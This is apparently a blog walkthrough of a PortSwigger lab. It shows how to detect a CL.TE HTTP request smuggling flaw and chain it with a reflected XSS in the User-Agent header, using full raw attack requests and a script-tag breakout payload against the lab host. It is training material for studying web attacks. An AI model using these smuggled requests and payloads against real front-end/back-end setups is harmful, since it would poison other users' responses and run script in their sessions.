---
title: " PortSwiggerlabs: Exploiting HTTP request smuggling to deliver reflected XSS"
date: 2026-07-06 00:00:00 +0000
categories: [PortSwiggerLabs , HTTP Request Smuggling ]
tags: [PortSwiggerLabs , HTTP Request Smuggling , Challenge , Web_Attacks ]
---



## Information : 

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

The application is also vulnerable to reflected XSS via the User-Agent header.

To solve the lab, smuggle a request to the back-end server that causes the next user's request to receive a response containing an XSS exploit that executes alert(1).


## Solution : 

Quick note:

HTTP Request Smuggling happens because of a disagreement between servers. In a typical setup you have a front-end (proxy, load balancer, CDN) forwarding requests to a back-end, and they share persistent TCP connections. The issue is that HTTP gives two ways to tell a server where a request body ends: Content-Length, which just counts bytes, and Transfer-Encoding: chunked, which sends the body in chunks ending with a zero-size chunk. When both headers are present in the same request, different servers may prioritize differently and that gap is what we exploit.

The idea is: you craft a request the front-end considers complete and forwards normally, but the back-end reads it differently and treats part of your body as leftover data sitting in the TCP buffer. That leftover then gets prepended to the next incoming request — yours or another user's. That's how you end up bypassing access controls, hijacking requests, or poisoning responses.

The three main variants are CL.TE, TE.CL, and TE.TE , basically which server trusts which header, or in the TE.TE case, how you obfuscate the Transfer-Encoding header enough that one server just ignores it entirely.

Before jumping into Burp, two things worth knowing: first, disable Update Content-Length in Repeater options , if Burp auto corrects your Content-Length you're defeating the whole point. Second, make sure you're sending over HTTP/1, not HTTP/2. When testing manually, timing delays are your main signal if the response hangs after your crafted request, the back-end is likely waiting for data that isn't coming, which means it's parsing things differently from the front-end. That's your confirmation.

Now back to the lab:

<img width="1390" height="695" alt="image" src="https://github.com/user-attachments/assets/c2e29f86-bbaa-4e0f-ab04-1d83bf4a21dd" />

Just like everytime we first need to find what case we've got , is it a CL.TE , TE.CL or a TE.TE . 

For this , I like to use this graph from **Jarno Timmermans** : 

<img width="1859" height="934" alt="image" src="https://github.com/user-attachments/assets/9a90be80-cfa7-4f38-921c-dffcba4b90b2" />

But you can use this guide from HackerReciepe : 

```bash
https://www.thehacker.recipes/web/config/http-request-smuggling/#practice
```

Now first let's send the detection request, that based on the response we will know if the backend and front end trust different Headers :

- First Downgrade the request to HTTP1.1/
- Then We change the request Method to POST 
- Then Remove Auto Length
- Add Transfer-Encoding: chunked
- Show Non-printable characters , this will be helpful when it comes to counting Bytes .
- In the Boy , add 

```bash
Content-Lenght: 6
Transfer-Encoding: chunked

1
123
X
```

<img width="766" height="310" alt="image" src="https://github.com/user-attachments/assets/57bbf928-72c0-4f40-bdec-400554d8ca75" />

Now if we send this , either we get an error which means the front end is definetly using TE , and since there is no terminating character we immediately get an error , and we need to figure out what the backend is using . 

Or we will get a delay , which means the front end does use CL , but the backend uses TE and since there is no terminating character , it will hang forever until we get a request time out . 

<img width="1289" height="587" alt="image" src="https://github.com/user-attachments/assets/3c436fea-54a4-479d-bbd4-d36f46c37e86" />

Perfect , a delay indicates it is a CL.TE .

To confirm , we can smuggle a request for 404 , if we send another normal request that returns 404 instead of 200 we will know that it is indeed a CL.TE . 

First the attack request : 

```bash
POST / HTTP/1.1
Host: 0a830060048ba1998139b16d00ca000a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

GET /404_Found HTTP/1.1
X-Ignore: X
```

<img width="1096" height="467" alt="image" src="https://github.com/user-attachments/assets/67fc4c95-84cc-43ef-834e-a5d7a9ac9057" />

Now if we send a normal request : 

<img width="1447" height="609" alt="image" src="https://github.com/user-attachments/assets/0776f7a4-f04e-46be-acf7-df979e76189a" />

Got the 404 , Perfect since this confirms the request for 404 was smuggled . 

For this lab , we know that the user agent is vulnerable to an XSS , but first we need to see if the user agent is reflected back to us in the response : 

<img width="1523" height="854" alt="image" src="https://github.com/user-attachments/assets/60a95577-8ca9-4eb6-8606-9ee35bc4c87f" />

For the / endpoint , we see that it is not reflected , but if we keep browsing the app , on the responses for different items we find that the user agent is indeed reflected back to us : 

<img width="1536" height="927" alt="image" src="https://github.com/user-attachments/assets/1f6bbd1f-addd-4f5d-8c4f-0a8a1c604869" />

Perfect this is where we will inject :

Let's try injecting the User agent and see what we get , first used a very basic payload :

```js
<script>alert(1)</script>
```

Bur before we need to break out of the tag before injecting : 

```js
"><script>alert(1)</script>
```

<img width="1582" height="657" alt="image" src="https://github.com/user-attachments/assets/3668cd48-f7c7-483e-af33-5e1843e65c96" />

Perfect we see that we were able to break out of the quotes and get our payload as part of the HTML . Now if we wanted to see it , either use the render option on Burp or get a link By using the Request in Browser feature . 

<img width="1470" height="731" alt="image" src="https://github.com/user-attachments/assets/1ce74aae-655b-48e4-8ba3-19f8f47cb84e" />

If we select to have it in our current browser section : 

<img width="1538" height="793" alt="image" src="https://github.com/user-attachments/assets/5fcbd02a-7e24-4af0-859a-612953656e99" />

Now if we paste that URL : 

<img width="1418" height="452" alt="image" src="https://github.com/user-attachments/assets/557405d6-1416-4db2-a046-21487e8e8db2" />

We get our XSS payload executed , but that's not what we want , we need the XSS to execute inside another user's session . 

Which means we will be smuggling a request where we inject our payload , the request containing the XSS will be stored in the buffer , next time someone make any request , it will be appended to our smuggled request , and it will fire the XSS on their browser . 

First we need our Attack request , or the request where we will be smuggling the request containing the XSS .

The request we're smuggling is the same request we were able to inject in (the one that reflects our user agent) : 

```bash
GET /post?postId=4 HTTP/2
Host: 0a830060048ba1998139b16d00ca000a.web-security-academy.net
Cookie: session=XFtbyOurjQnp0C2rFXYPtZTCpM9FUn8d
Sec-Ch-Ua: "Chromium";v="133", "Not(A:Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a830060048ba1998139b16d00ca000a.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

Now of course we can get rid of the headers that we don't need : 

```bash
GET /post?postId=4 HTTP/2
User-Agent: "><script>alert(1)</script>
Content-Length: 3
Content-Type: application/x-www-form-urlencoded

x=
```

Perfect now this will come right after the terminating character of the initial request :

```bash
POST / HTTP/1.1
Host: 0a830060048ba1998139b16d00ca000a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

GET /post?postId=4 HTTP/2
User-Agent: "><script>alert(1)</script>
Content-Length: 3
Content-Type: application/x-www-form-urlencoded

x=
```

The reason why we add CL and x= is just so that the normal request gets appended inside the body of the smuggled request , after the x= , this way we get rid of all possible errors like the double Host headers , double Request methods etc...

<img width="1436" height="612" alt="image" src="https://github.com/user-attachments/assets/62814f59-870f-4176-8711-62409cc05b21" />

Once we send the attack request , all we need to do now is just send the normal request and it will executed the XSS from the smuggled request :) 

<img width="1633" height="757" alt="image" src="https://github.com/user-attachments/assets/4f16c13e-d375-4c82-bbea-54bf8afab0b8" />

All of this without any user interaction . 

That was all for this lab , see you in the next one :)
